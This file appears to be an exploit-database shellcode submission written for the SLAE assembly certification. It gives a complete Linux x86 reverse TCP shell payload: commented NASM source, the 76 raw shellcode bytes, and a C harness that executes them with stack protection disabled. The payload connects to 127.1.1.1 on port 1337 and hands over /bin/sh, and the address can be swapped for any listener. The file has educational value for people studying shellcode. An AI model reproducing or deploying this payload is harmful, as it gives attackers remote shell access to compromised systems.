/*
# Exploit Title: Linux x86 IPv4 Reverse TCP Shellcode (76 bytes/null free)
# Date: 2018-08-25
# Shellcode Author: Kevin Kirsche
# Shellcode Repository: https://github.com/kkirsche/SLAE/tree/master/assignment_2-reverse_shell
# Tested on: Shell on Ubuntu 18.04 with gcc 7.3.0 / Connecting to Kali 2018.2

# This shellcode will connect to 127.1.1.1 (to avoid nulls) on port 1337 and give you /bin/sh

This shellcode has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
Student ID: SLAE-1134

Compilation instructions:
	gcc -o shellcode shellcode.c -fno-stack-protector -z execstack

Commented NASM:
  global _start

  section .text

  _start:
    ; socket
    ;; cleanup
    xor ebx, ebx
    ;; arguments
    push ebx          ; #define IP_PROTO 0
    push 0x1          ; #define SOCK_STREAM 1
    push 0x2          ; #define PF_INET 2
    ;; function
    mov ecx, esp      ; pointer to args on the stack into ecx
    push 0x66
    pop eax           ; socketcall 0x66 == 102
    inc ebx           ; #define SYS_SOCKET 1
    ;; call
    int 0x80
    ;; returned data
    xchg esi, eax     ; sockfd eax -> esi

    ; connect ipv4
    ;; v4lhost struct
    inc ebx           ; 0x1 becomes 0x2 (PF_INET)
    push 0x0101017F   ; v4lhost.sin_addr.s_addr = 127.1.1.1
    push word 0x3905  ; v4lhost.sin_port = htons(1337)
    push bx           ; v4lhost.sin_family = 0x2 (AF_INET)
    ;; arguments
    inc ebx           ; 0x2 becomes 0x3 (SYS_CONNECT)
    mov ecx, esp      ; move our struct pointer into ECX
    push 0x10         ; sizeof v4lhost
    push ecx          ; pointer v4lhost
    push esi          ; push sockfd onto the stack
    ;; function
    mov ecx, esp      ; pointer to args on the stack into ecx
    push 0x66         ; socketcall()
    pop eax
    ;; call
    int 0x80
    ;; returned data
    xchg ebx, esi     ; put sockfd into ebx for dup call

    ; dup2
    ;; setup counters
    sub ecx, ecx
    mov cl, 0x2
    ;; loop
  duploop:
    mov al, 0x3f      ; SYS_DUP2 syscall
    int 0x80          ; call SYS_DUP2
    dec ecx           ; decrement loop counter
    jns duploop       ; as long as SF is not set, keep looping

    ; execve
    ;; cleanup
    xor edx, edx
    ;; command to run
    push edx          ; NULL string terminator
    push 0x68732f2f   ; hs//
    push 0x6e69622f   ; nib/
    ;; arguments
    mov ecx, edx      ; null
    mov ebx, esp      ; pointer to args into ebx
    mov al, 0x0b      ; execve systemcall
    ;; call
    int 0x80
*/
#include <stdio.h>
#include <string.h>

unsigned char code[] = "\x31\xdb\x53\x6a\x01\x6a\x02\x89\xe1\x6a\x66\x58\x43"
  "\xcd\x80\x96\x43\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x66\x53\x43\x89\xe1"
  "\x6a\x10\x51\x56\x89\xe1\x6a\x66\x58\xcd\x80\x87\xde\x29\xc9\xb1\x02\xb0"
  "\x3f\xcd\x80\x49\x79\xf9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
  "\x6e\x89\xd1\x89\xe3\xb0\x0b\xcd\x80";

int main() {
  // pollute the registers
  asm("mov $0x78975432, %eax\n\t"
      "mov $0x17645589, %ecx\n\t"
      "mov $0x23149875, %edx\n\t");

  // begin shellcode
	printf("Shellcode Length:  %d\n", strlen(code));
  // execute our shellcode
	int (*ret)() = (int(*)())code;
	ret();
}
